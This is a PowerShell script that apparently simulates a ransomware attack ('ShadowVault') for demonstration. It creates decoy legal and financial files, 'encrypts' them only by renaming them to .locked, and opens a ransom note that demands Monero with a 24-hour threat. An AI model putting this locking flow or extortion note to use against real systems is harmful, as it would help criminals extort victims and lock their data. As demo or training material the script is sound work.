# --- SHADOWVAULT CONFIGURATION ---
$targetDir = "C:\Users\Public\Documents\Legal_Files"
$ransomNotePath = "$targetDir\#RANSOM_NOTICE.txt"

# 1. PREPARATION (Demo Mode: Create dummy files if they don't exist)
Write-Host "[*] Initializing ShadowVault..." -ForegroundColor Red
if (!(Test-Path $targetDir)) {
    New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
    # Create fake sensitive files
    Set-Content -Path "$targetDir\Confidential_Contract.docx" -Value "STRICTLY CONFIDENTIAL - DO NOT SHARE"
    Set-Content -Path "$targetDir\Q4_Budget_2025.xlsx" -Value "FINANCIAL PROJECTIONS Q4"
    Set-Content -Path "$targetDir\Client_Database.db" -Value "PII DATA - GDPR PROTECTED"
    Write-Host "[+] Decoy files created at $targetDir" -ForegroundColor Yellow
}

# 2. ENCRYPTION (Simulated by renaming)
$files = Get-ChildItem -Path $targetDir -File | Where-Object {$_.Extension -ne ".locked" -and $_.Name -ne "#RANSOM_NOTICE.txt"}

if ($files) {
    foreach ($file in $files) {
        $newPath = $file.FullName + ".locked"
        Move-Item -Path $file.FullName -Destination $newPath -Force
        Write-Host " -> Encrypted: $($file.Name)" -ForegroundColor DarkRed
    }
} else {
    Write-Host "[!] No new files found to encrypt." -ForegroundColor Gray
}

# 3. RANSOM NOTE GENERATION
$note = @"
===================================================
   !!! YOUR FILES HAVE BEEN ENCRYPTED !!!
===================================================

Attack ID: ShadowVault
Target: Legal Department

Your documents have been locked with military-grade encryption (ChaCha20).
Attempts to recover them without the key will result in permanent data loss.

PAYMENT INSTRUCTIONS:
1. Send 30 XMR (Monero) to wallet: 442uGwAd2V...
2. Send proof of payment to our Telegram Bot.

You have 24 hours. The clock is ticking...

-- Alice
"@

Set-Content -Path $ransomNotePath -Value $note

# 4. VISUAL IMPACT (Launch Note)
Write-Host "[!] Deploying ransom note..." -ForegroundColor Red
Start-Process "notepad.exe" $ransomNotePath